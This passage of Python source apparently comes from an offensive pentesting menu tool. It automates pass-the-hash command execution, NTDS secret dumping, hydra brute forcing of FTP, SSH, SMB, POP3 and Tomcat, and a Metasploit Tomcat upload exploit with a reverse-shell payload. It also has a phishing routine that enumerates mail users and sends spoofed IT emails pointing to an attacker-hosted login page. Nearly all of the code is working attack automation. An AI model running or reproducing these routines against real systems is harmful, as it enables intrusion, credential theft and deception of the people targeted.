            print("[" + colored("+", colour6) + "] Other exploitable machines on the same subnet...\n")
            command("crackmapexec winrm " + TIP.rstrip(" ") + "/24")
         
            print("\n[+] Trying specified windows command...\n")
            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " -x whoami /all")

            print("\n[+] Trying to enumerate users and shares...\n")  
            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " --users")
            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " --shares")
         
            print("\n[+] Trying a few other command while I am here...\n")
            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " -x net user Administrator /domain")
            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " -x --lusers")
            
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Remote Windows login using IMPERSONATE & NTM HASH - -service-name LUALL.exe"
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='56':
      checkParams = testTwo()

      if checkParams != 1:
         print("[" + colored("*", colour8) + "] Trying user " + USR.rstrip(" ") + " with NTM HASH " + NTM.rstrip("\n") + "...\n")
         command(keyPath + "psexec.py -hashes :" + NTM.rstrip("\n") + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -no-pass")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - domain/username:password@<targetName or address
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='57':
      checkParams = testTwo()

      if checkParams != 1:
         print("[" + colored("*", colour8) + "] Trying user " + USR.rstrip(" ") + " with NTM HASH " + NTM.rstrip(" ") + "...\n")
         command(keyPath + "smbexec.py -hashes :" + NTM.rstrip(" ") + " " + DOM.rstrip(" ") + "\\" + USR.rstrip(" ") + "@" + TIP.rstrip(" "))      
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Remote Windows login using IMPERSONATE & NTM HASH.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='58':
      checkParams = testTwo()
      
      if checkParams != 1:
         print("[" + colored("*", colour8) + "] Trying user " + USR.rstrip(" ") + " with NTLM HASH " + NTM.rstrip("\n") + "...\n")
         command(keyPath + "wmiexec.py -hashes :" + NTM.rstrip("\n") + " " + USR.rstrip(" ") + "@" + TIP.rstrip(" "))
      prompt()     

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - NTDS CRACKER (EXPERIMENTAL)
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='59':           
      print("[" + colored("*", colour8) + "] Checking " + workDir + " for relevant files...")

      if os.path.exists("./" + DIR.rstrip(" ") + "/ntds.dit"):
         print("[" + colored("+", colour6) + "] File ntds.dit found...")
      else:
         print("[" + colored("-", colour7) + "] File ntds.dit not found...")
         checkParams = 1
         
      if os.path.exists("./" + DIR.rstrip(" ") + "/SYSTEM"):
         print("[" + colored("+", colour6) + "] File SYSTEM found...")
      else:
         print("[" + colored("-", colour7) + "] File SYSTEM not found...")
         checkParams = 1         

      if os.path.exists("./" + DIR.rstrip(" ") + "/SECURITY"):
         print("[" + colored("+", colour6) + "] File SECURITY found...")
      else:
         print("[" + colored("-", colour7) + "] File SECURITY not found")
         checkParams = 1       
         
      if checkParams != 1:
         print("[" + colored("*", colour8) + "] Extracting stored secrets, please wait...")
         command(keyPath + "secretsdump.py -ntds ./" + DIR.rstrip(" ") + "/ntds.dit -system ./" + DIR.rstrip(" ") +  "/SYSTEM -security ./" + DIR.rstrip(" ") + "/SECURITY -hashes lmhash:nthash -pwd-last-set -history -user-status LOCAL -outputfile ./" + DIR.rstrip(" ") +  "/ntlm-extract > log.tmp")
      
         command("cut -f1 -d':' ./" + DIR.rstrip(" ") + "/ntlm-extract.ntds > " + dataDir + "/usernames.txt")
         command("cut -f4 -d':' ./" + DIR.rstrip(" ") + "/ntlm-extract.ntds > " + dataDir + "/hashes.txt")         
         print("[" + colored("+", colour6) + "] Imported extracted secrets...")
      
         with open(dataDir + "/usernames.txt", "r") as read1, open(dataDir + "/hashes.txt", "r") as read2:
           for x in range (0, maxUser):
               USER[x] = read1.readline().rstrip("\n")
               if USER[x] != "":
                  USER[x] = spacePadding(USER[x], COL3)
                  
               HASH[x] = read2.readline().rstrip("\n")
               if USER[x] != "":
                  HASH[x] = spacePadding(HASH[x], COL4)
               else:
                  HASH[x] = dotPadding(HASH[x], COL4)
               VALD[x] = "0"
           resetTokens()
      else:
            print("[" + colored("*", colour8) + "] Please ensure that any missing files are placed in the work folder...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - SSH GEN GENERATION
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='60':
      print("[" + colored("*", colour8) + "] Generating Keys...\n")
      command("ssh-keygen -t rsa -b 4096 -N '' -f './id_rsa' >/dev/null 2>&1")
      command("tput setaf 2; tput bold")
      command("cat id_rsa.pub")
      command("tput sgr0; tput dim")
      print("[" + colored("+", colour6) + "] Insert the above into authorized_keys on the victim's machine...")
      if USR[:2] == "''":
         print("[" + colored("+", colour6) + "] Then ssh login with this command:- ssh -i id_rsa user@" + TIP.rstrip(" ") +"...")
      else:
         print("[" + colored("+", colour6) + "] Then ssh login with this command:- ssh -i id_rsa " + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + "...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - https://tools.kali.org/password-attacks/cewl
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='61':
      checkParams = testOne()
   
      if checkParams != 1:
         if WEB[:1] != "":
            command("cewl --depth 5 --min_word_length 3 --email --with-numbers --write usernames.txt " + WEB.rstrip(" ") + " 2>&1")
            print("[" + colored("+", colour6) + "] User list generated via website...")
         else:
            command("cewl --depth 5 --min_word_length 3 --email --with-numbers --write usernames.txt " + TIP.rstrip(" ") + " 2>&1")
            print("[" + colored("+", colour6) + "] User list generated via ip address...")

         if os.path.exists("/usr/share/ncrack/minimal.usr"):
            command("cat /usr/share/ncrack/minimal.usr >> usernames.txt 2>&1")
            command("sed -i '/#/d' usernames.txt 2>&1")
            command("sed -i '/Email addresses found/d' usernames.txt 2>&1")
            command("sed -i '/---------------------/d' usernames.txt 2>&1")
            print("[" + colored("+", colour6) + "] Adding NCrack minimal.usr list as well...")

         for x in range (0,maxUser):
            USER[x] = linecache.getline("/usernames.txt", x+1).rstrip(" ")
            USER[x] = spacePadding(USER[x], COL3)
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - https://tools.kali.org/password-attacks/cewl
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='62':
      checkParams = testOne()  
   
      if checkParams != 1:
         if WEB[:1] != "":
            command("cewl --depth 5 --min_word_length 3 --email --with-numbers --write passwords.txt " + WEB.rstrip(" ") + " 2>&1")
            print("[" + colored("+", colour6) + "] Password list generated via website...")
         else:
            command("cewl --depth 5 --min_word_length 3 --email --with-numbers --write passwords.txt " + TIP.rstrip(" ") + " 2>&1")
            print("[" + colored("+", colour6) + "] Password list generated via ip address...")

         if os.path.exists("/usr/share/ncrack/minimal.usr"):
            command("cat /usr/share/ncrack/minimal.usr >> passwords.txt 2>&1")
            command("sed -i '/#/d' passwords.txt 2>&1")
            command("sed -i '/Email addresses found/d' passwords.txt 2>&1")
            command("sed -i '/---------------------/d' passwords.txt 2>&1")
            print("[" + colored("+", colour6) + "] Adding NCrack minimal.usr list as well...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Nano usernames.txt
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='63':
      command("nano usernames.txt")
      
      for x in range (0, maxUser):
         USER[x] = linecache.getline("/usernames.txt", x + 1).rstrip(" ")
         USER[x] = spacePadding(USER[x], COL3)         
      prompt()
            
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Nano passwords.txt
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='64':
      command("nano passwords.txt")
      
      for x in range (0, maxUser):
         HASH[x] = linecache.getline(dataDir + "/hashes.txt", x + 1).rstrip(" ")
         HASH[x] = spacePadding(HASH[x], COL4)     
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Editor  hashes.txt
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='65':
      command("nano hashes.txt")
           
      for x in range (0, maxUser):
            HASH[x] = linecache.getline(dataDir + "/hashes.txt", x + 1).rstrip(" ")
            HASH[x] = spacePadding(HASH[x], COL4)                        
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Editor hosts.conf
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='66':
      command("nano /etc/hosts")
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Mr Phiser is experimental!!
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='67':
      checkParams = testTwo()

      if "25" not in POR:
         print(colored("[!] WARNING!!! - Port 25 not found in remote live ports listing...", colour0))
         checkParams = 1
         
      if checkParams != 1:
         command("xdotool key Ctrl+Shift+T")
         command("xdotool key Alt+Shift+S; xdotool type 'Go Phishing'; xdotool key Return; sleep 2")
         
         with open("logo2.tmp", "a") as logo:
            logo.write("  ____  ___    ____  _   _ ___ ____  _   _ ___ _   _  ____ \n")
            logo.write(" / ___|/ _ \  |  _ \| | | |_ _/ ___|| | | |_ _| \ | |/ ___|\n")
            logo.write("| |  _| | | | | |_) | |_| || |\___ \| |_| || ||  \| | |  _ \n")
            logo.write("| |_| | |_| | |  __/|  _  || | ___) |  _  || || |\  | |_| |\n")
            logo.write(" \____|\___/  |_|   |_| |_|___|____/|_| |_|___|_| \_|\____|\n")
            logo.write("                                                           \n")
            logo.write("   BY TERENCE BROADBENT BSc CYBERSECURITY (FIRST CLASS)    \n")
         logo.close()
         
         command("xdotool type 'cat logo2.tmp'; xdotool key Return")
         command("xdotool type 'nc -nvlp 80'; xdotool key Return")
         command("xdotool key Ctrl+Shift+Tab")
                 
         command('echo "Hello.\n" > body.tmp')
         command('echo "We just performed maintenance on our servers." >> body.tmp')
         command('echo "Please verify if you can still access the login page:\n" >> body.tmp')
         command('echo "\t  <img src=\""' + localIP + '"/img\">" >> body.tmp')
         command('echo "\t  Citrix http://"' + localIP + '"/" >> body.tmp')
         command('echo "  <a href=\"http://"' + localIP + '"\">click me.</a>" >> body.tmp')

         command('echo "\nRegards," >> body.tmp')
         command('echo "it@"' + DOM.rstrip(" ") + '""  >> body.tmp')
         
         print("[" + colored("*", colour8) + "] Created phishing email...\n")
         print(colored("Subject: Credentials/Errors\n", colour3))
         
         with open("body.tmp", "r") as list:
            for phish in list:
               phish = phish.rstrip("\n")
               print(colored(phish,colour3))
            print("")
            
         print("[" + colored("*", colour8) + "] Checking for valid usernames...")
         command("smtp-user-enum -U usernames.txt -d " + DOM.rstrip(" ") + " -m RCPT " + DOM.rstrip(" ") + " 25 | grep SUCC > valid1.tmp")                 
         command("tr -cd '\11\12\15\40-\176' < valid1.tmp > valid.tmp")
         
         match = 0         
         with open("valid.tmp", "r") as list:			# CLEAN FILE
            for line in list:
               line.encode('ascii',errors='ignore')
               line = line.rstrip("\n")
               line = line.replace('[92m','')
               line = line.replace('[00m','')
               line = line.replace('[SUCC] ', '')
               line = line.replace('250 OK', '')
               line = line.replace('...', '')
               line = line.replace(' ','')
               if "TEST" not in line:                  
                  command("echo " + line + " >> phish.tmp")
                  match = 1
                  
         if match == 1:						# SHOW FOUND PHISH
             print("[" + colored("+", colour6) + "] Found valid email addresses...\n")
             with open("phish.tmp", "r") as list:
                for line in list:
                   line = line.rstrip("\n")
                   print(colored(line + "@" + DOM.rstrip(" "),colour6))
                           
         if match == 1:
            print("\n[*] Phishing the list...")			# GO PHISHING
            with open("phish.tmp", "r") as list:
               for phish in list:
                  phish = phish.rstrip("\n")
                  phish = phish.strip(" ")
                  phish = phish + "@"
                  phish = phish + DOM.rstrip(" ")
                  command("swaks --to " + phish + " --from it@" + DOM.rstrip(" ") + " --header 'Subject: Credentials / Errors' --server " + TIP.rstrip(" ") + " --port 25 --body @body.tmp > log.tmp")
                  print("[" + colored("+", colour6) + "] Mail sent to " + phish + "...")
         else:
            print("[" + colored("-", colour7) + "] No valid email addresses where found...")
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - GOBUSTER WEB ADDRESS/IP common.txt
# Details : Alternative dictionary - /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='68':
      checkParams = testOne()
           
      if checkParams != 1:
         if WEB[:5] == "EMPTY":
            command("gobuster dir -r -U " + USR.rstrip(" ") + " -P " + PAS.rstrip(" ") + " -u " + TIP.rstrip(" ") + " -x " + fileExt + " -f -w /usr/share/dirb/wordlists/common.txt -t 50")
         else:
            if (WEB[:5] == "https") or (WEB[:5] == "HTTPS"):
               command("gobuster dir -r -U " + USR.rstrip(" ") + " -P " + PAS.rstrip(" ") + " -u '" + WEB.rstrip(" ") + "' -x " + fileExt + " -f -w /usr/share/dirb/wordlists/common.txt -t 50 -k") 
            else: 
               command("gobuster dir -r -U " + USR.rstrip(" ") + " -P " + PAS.rstrip(" ") + " -u " + WEB.rstrip(" ") + " -x " + fileExt + " -f -w /usr/share/dirb/wordlists/common.txt -t 50")
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Nikto scan
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='69':
      checkParams = testOne()

      if checkParams != 1:
         if ":" in TIP:
            print(colored("[!] WARNING!!! - IP6 is currently not supported...", colour0))
            checkParams = 1         
         
         if checkParams != 1:
            if WEB[:5] != "EMPTY":
               command("nikto -h " + WEB.rstrip(" "))
            else:
               command("nikto -h " + TIP.rstrip(" "))
      prompt()  
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - HYDRA BRUTE FORCE FTP
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='70':
      checkParams = testOne()
         
      if checkParams != 1:
         if os.path.getsize(dataDir + "/usernames.txt") == 0:
            print("[" + colored("-", colour7) + "] Username file is empty...")
            if USER[:1] != "'":
               print("[" + colored("*", colour8) + "] Adding user '" + USR.rstrip(" ") + "'...")
               command("echo " + USR.rstrip(" ") + " >> " + dataDir + "/usernames.txt")
            else:
               print("[" + colored("*", colour8) + "] Adding user 'administrator'...")
               command("echo 'administrator' >> " + dataDir + "/usernames.txt")
         
         if os.path.getsize(dataDir + "/passwords.txt") == 0:             
            print("[" + colored("-", colour7) + "] Password file is empty...")
            if HASH[:1] != "'":
               print("[" + colored("*", colour8) + "] Adding password '" + PAS.rstrip(" ") + "'...")
               command("echo '" + PAS.rstrip(" ") + "' >> passwords.txt")
            else:
               print("[" + colored("*", colour8) + "] Adding password 'password'...")
               command("echo password >> passwords.txt")
         
         if "21" in POR:
            command("hydra -P passwords.txt -L usernames.txt ftp://" + TIP.rstrip(" "))
         else:
            print("[" + colored("-", colour7) + "] FTP port not found in LIVE PORTS...")
         
         for x in range (0,maxUser):
            USER[x] = linecache.getline("/usernames.txt", x + 1).rstrip(" ")
            USER[x] = spacePadding(USER[x], COL3)
            
      prompt() 
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - HYDRA BRUTE FORCE SSH
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='71':
      checkParams = testOne()
         
      if checkParams != 1:
         if os.path.getsize(dataDir + "/usernames.txt") == 0:
            print("[" + colored("-", colour7) + "] Username file is empty...")
            if USER[:1] != "'":
               print("[" + colored("*", colour8) + "] Adding user '" + USR.rstrip(" ") + "'...")
               command("echo " + USR.rstrip(" ") + " >> " + dataDir + "/usernames.txt")
            else:
               print("[" + colored("*", colour8) + "] Adding user 'administrator'...")
               command("echo 'administrator' >> " + dataDir + "/usernames.txt")
         
         if os.path.getsize(dataDir + "/passwords.txt") == 0:             
            print("[" + colored("-", colour7) + "] Password file is empty...")
            if HASH[:1] != "'":
               print("[" + colored("*", colour8) + "] Adding password '" + PAS.rstrip(" ") + "'...")
               command("echo '" + PAS.rstrip(" ") + "' >> passwords.txt")
            else:
               print("[" + colored("*", colour8) + "] Adding password 'password'...")
               command("echo password >> passwords.txt")
         
         if "22" in POR:
            command("hydra -P passwords.txt -L usernames.txt ssh://" + TIP.rstrip(" "))
         else:
            print("[" + colored("-", colour7) + "] SSH port not found in LIVE PORTS...")
         
         for x in range (0,maxUser):
            USER[x] = linecache.getline("/usernames.txt", x + 1).rstrip(" ")
            USER[x] = spacePadding(USER[x], COL3)
            
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - HYDRA SMB BRUTEFORCE
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='72':
      checkParams = testOne()

      if checkParams != 1:
         if os.path.getsize(dataDir + "/usernames.txt") == 0:
            print("[" + colored("-", colour7) + "] Username file is empty...")
            if USER[:1] != "'":
               print("[" + colored("*", colour8) + "] Adding user '" + USR.rstrip(" ") + "'...")
               command("echo " + USR.rstrip(" ") + " >> " + dataDir + "/usernames.txt")
            else:
               print("[" + colored("*", colour8) + "] Adding user 'administrator'...")
               command("echo 'administrator' >> " + dataDir + "/usernames.txt")
         
         if os.path.getsize(dataDir + "/passwords.txt") == 0:             
            print("[" + colored("-", colour7) + "] Password file is empty...")
            if HASH[:1] != "'":
               print("[" + colored("*", colour8) + "] Adding password '" + PAS.rstrip(" ") + "'...")
               command("echo '" + PAS.rstrip(" ") + "' >> passwords.txt")
            else:
               print("[" + colored("*", colour8) + "] Adding password 'password'...")
               command("echo password >> passwords.txt")
         
         if "445" in POR:
            command("hydra -P passwords.txt -L usernames.txt smb://" + TIP.rstrip(" "))
         else:
            print("[" + colored("-", colour7) + "] SMB port not found in LIVE PORTS...")
         
         for x in range (0,maxUser):
            USER[x] = linecache.getline("/usernames.txt", x + 1).rstrip(" ")
            USER[x] = spacePadding(USER[x], COL3)
            
      prompt() 

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - HYDRA POP3 BRUTEFORCE
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='73':
      checkParams = testOne()
         
      if checkParams != 1:
         if os.path.getsize(dataDir + "/usernames.txt") == 0:
            print("[" + colored("-", colour7) + "] Username file is empty...")
            if USER[:1] != "'":
               print("[" + colored("*", colour8) + "] Adding user '" + USR.rstrip(" ") + "'...")
               command("echo " + USR.rstrip(" ") + " >> " + dataDir + "/usernames.txt")
            else:
               print("[" + colored("*", colour8) + "] Adding user 'administrator'...")
               command("echo 'administrator' >> " + dataDir + "/usernames.txt")
         
         if os.path.getsize(dataDir + "/passwords.txt") == 0:             
            print("[" + colored("-", colour7) + "] Password file is empty...")
            if HASH[:1] != "'":
               print("[" + colored("*", colour8) + "] Adding password '" + PAS.rstrip(" ") + "'...")
               command("echo '" + PAS.rstrip(" ") + "' >> passwords.txt")
            else:
               print("[" + colored("*", colour8) + "] Adding password 'password'...")
               command("echo password >> passwords.txt")
         
         if "110" in POR:
            command("hydra -P passwords.txt -L usernames.txt " + TIP.rstrip(" ") + " POP3")
         else:
            if "995" in POR:
               command("hydra -P passwords.txt -L usernames.txt " + TIP.rstrip(" ") + " POP3s")
            else:
               print("[" + colored("-", colour7) + "] POP3 ports not found in LIVE PORTS...")
               
         for x in range (0,maxUser):
            USER[x] = linecache.getline("/usernames.txt", x + 1).rstrip(" ")
            USER[x] = spacePadding(USER[x], COL3)
            
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - TOMCAT WEB ADDRESS BRUTE FORCE
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='74':  
      if WEB[:5] == "EMPTY":
         print("[" + colored("-", colour7) + "] Target web address not specified...")
      else:
         print("[" + colored("*", colour8) + "] Attempting a tomcat bruteforce on the specified web address, please wait...")
         
         command("rm " + dataDir + "/usernames.txt")
         command("rm passwords.txt")
         
         with open('/usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt', 'r') as userpasslist:
            for line in userpasslist:
               one, two = line.strip().split(':')
               command("echo " + one + " >> usernames.tmp")
               command("echo " + two + " >> passwords.tmp")
               
            command("cat usernames.tmp | sort -u > " + dataDir + "/usernames.txt")
            command("cat passwords.tmp | sort -u > passwords.txt")
            command("rm *.tmp")
            
         if "http://" in WEB.lower():
            target = WEB.replace("http://","")
            command("hydra -L usernames.txt -P passwords.txt http-get://" + target.rstrip(" "))
         
         if "https://" in WEB.lower():
            target = target.replace("https://","")
            command("hydra -L usernames.txt -P passwords.txt https-get://" + target.rstrip(" "))
                          
         for x in range (0,maxUser):
            USER[x] = linecache.getline("/usernames.txt", x + 1).rstrip(" ")
            USER[x] = spacePadding(USER[x], COL3)
            
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - MSFCONSOLE TOMCAT CLASSIC EXPLOIT
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='75':
      command("touch meterpreter.rc")
      command("echo 'use exploit/multi/http/tomcat_mgr_upload' >> meterpreter.rc")
      command("echo 'set RHOSTS " + TIP.rstrip(" ") + "' >> meterpreter.rc")
      if "8080" in POR:
         command("echo 'set RPORT 8080' >> meterpreter.rc")
      else:
         DATA = input("Please enter tomcat port number: ")
         command("echo 'set RPORT " + DATA + "' >> meterpreter.rc")
      DATA = PAS.rstrip(" ")
      command("echo 'set HttpPassword " + DATA + "' >> meterpreter.rc")
      DATA = USR.rstrip(" ")
      command("echo 'set HttpUsername " + DATA + "' >> meterpreter.rc")
      command("echo 'set payload java/shell_reverse_tcp' >> meterpreter.rc")
      command("hostname -I >> temp.tmp")
      target = linecache.getline("temp.tmp",1)
      command("rm temp.tmp")
      one, two, three, four = target.split(" ")
      target = two.rstrip(" ")
      command("echo 'set lhost " + target + "' >> meterpreter.rc")
      command("echo 'run' >> meterpreter.rc")      
      command("msfconsole -r meterpreter.rc")     
      prompt() 
      command("rm meterpreter.rc")  
           
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - rsync -av rsync://IP:873/SHARENAME SHARENAME
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='76':
      checkParams = testOne()
   
      if checkParams != 1:
         if "873" in POR:
            command("rsync -av rsync://" + TIP.rstrip(" ") +  ":873/" + TSH.rstrip(" ") + " " + TSH.rstrip(" "))
         else:
            print("[" + colored("-", colour7) + "] Port 873 not found in LIVE PORTS...")
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - rsync -a rsync://IP:873
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='77':
      checkParams = testOne()
      
      if checkParams != 1:
         if "873" in POR:
            command("rsync -a rsync://" + TIP.rstrip(" ") +  ":873")
         else:
            print("[" + colored("-", colour7) + "] Port 873 not found in LIVE PORTS...")      
      prompt()   
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - rdesktop - u user -p password -d domain / IP port num?
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='78':
      checkParams = testOne()
   
      if checkParams != 1:
         command("rdesktop -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' " + TIP.rstrip(" "))
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Xfreeredp port number ?
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '79':
      checkParams = testOne()
      
      if checkParams != 1:
         command("xfreerdp /u:" + USR.rstrip(" ") + " /p:'" + PAS.rstrip(" ") + "' /v:" + TIP.rstrip(" "))
      prompt()  
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - FTP PORT 21
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='80':
      checkParams = testOne()
      
      if checkParams != 1:
         command("ftp " + TIP.rstrip(" ") + " 21")
      prompt()       
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - ssh -l USER IP -p PORT 22
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='81':
      checkParams = testOne()
      
      if checkParams != 1:
         command("ssh -l " + USR.rstrip(" ") + " " + TIP.rstrip(" ") + " -p 22")
      prompt() 

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - ssh -i id USER@IP -p 22
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='82':
      checkParams = testOne()
      
      if checkParams != 1:
         command("ssh -i id_rsa " + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -p 22")
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - telnet -l USER IP PORT 23
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='83':
      checkParams = testOne()
      
      if checkParams != 1:
         command("telnet -l " + USR.rstrip(" ") + " " + TIP.rstrip(" ") + " 23")
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - nc IP PORT 80.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='84':
      checkParams = testOne()
      
      if checkParams != 1:
         command("nc " + TIP.rstrip(" ") + " 80")
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - sqsh -H IP -L user=USER -L password=PASSWORD + exec xp_cmdshell 'whoami'; go PORT 1433
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='85':
      checkParams = testOne()
      
      if checkParams != 1:
         command("sqsh -S " + TIP.rstrip(" ") + " -L user=" + USR.rstrip(" ") + " -L password=" + PAS.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - MSSQLCLIENT PORT 1433
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='86':
      checkParams = testTwo()
   
      if checkParams != 1:
          command(keyPath + "mssqlclient.py " + DOM.rstrip(" ") + "\\" + USR.rstrip(" ") + "@" + TIP.rstrip(" "))
      else:
          command(keyPath + "mssqlclient.py " + USR.rstrip(" ") + "@" + TIP.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - MYSQL Login using port 3306
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='87':
      checkParams = testOne()
      
      if checkParams != 1:
         command("mysql -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " -h " + TIP.rstrip(" "))
      prompt() 

# ------------------------------------------------------------------------------------- 
